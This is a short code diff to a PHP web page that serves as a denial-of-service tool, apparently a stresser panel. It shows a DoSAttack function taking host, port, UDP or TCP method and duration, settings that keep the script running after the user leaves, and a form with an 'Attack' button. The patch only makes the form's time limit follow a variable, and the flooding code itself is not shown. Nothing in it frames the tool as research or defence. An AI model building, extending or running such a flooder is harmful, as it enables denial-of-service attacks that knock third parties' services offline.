@@ -2,7 +2,7 @@
 set_time_limit(0);
 ignore_user_abort(true);
 
-$mt = '300'; // Max. time, change this in input[time] too.
+$mt = '300'; // Max. time
 
 function DoSAttack($host, $port, $method, $time){
 	switch($method){
@@ -111,7 +111,7 @@ if(isset($_POST['host'])&&isset($_POST['port'])&&isset($_POST['method'])&&isset(
 					<input type="text" id="host" name="host" placeholder="Host" style="color: rgb(255,0,0);" required/><br />
 					<input type="number" id="port" name="port" min="1" max="65535" placeholder="Port" style="color: rgb(255,0,0);" required/> | 
 					<select name="method" style="color: rgb(117,117,117); background-color: rgb(0,0,0); border-radius: 3px;" required><option value="udp" selected disabled>-- Methods --</option><option value="udp">UDP</option><option value="tcp">TCP</option></select><br />
-					<!-- max. 5 minutes (300 seconds)--><input type="number" id="time" name="time" min="1" max="300" placeholder="Time" style="color: rgb(255,0,0);" required/><br />
+					<!-- max. 5 minutes (300 seconds)--><input type="number" id="time" name="time" min="1" max="<?php echo $mt; ?>" placeholder="Time" style="color: rgb(255,0,0);" required/><br />
 					<input type="submit" value="Attack" style="color: rgb(255,0,0);"/>
 				</form>
 			</fieldset>
